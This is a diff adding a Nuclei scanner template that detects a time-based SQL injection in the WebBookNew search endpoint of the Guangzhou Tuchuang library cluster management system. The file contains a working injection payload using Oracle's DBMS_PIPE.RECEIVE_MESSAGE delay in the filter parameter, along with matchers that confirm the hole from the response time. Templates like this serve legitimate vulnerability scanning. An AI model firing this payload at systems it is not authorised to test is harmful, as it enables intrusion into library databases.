@@ -1,0 +1,29 @@
+id: poc-yaml-guangzhou-tuchuang-webbooknew-sqli
+info:
+  name: SQL Injection Vulnerability in Guangzhou Tuchuang Library Cluster Management System WebBookNew
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 1}}'
+http:
+  - raw:
+      - |
+        GET /interlib/websearch/WebBookNew?cmdACT=search_BookNew&showpage=1&filter=1+AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS', {{t1}}) HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Nuclei
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: body
+        words:
+          - "<name>书目查询</name>"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
+    matchers-condition: and
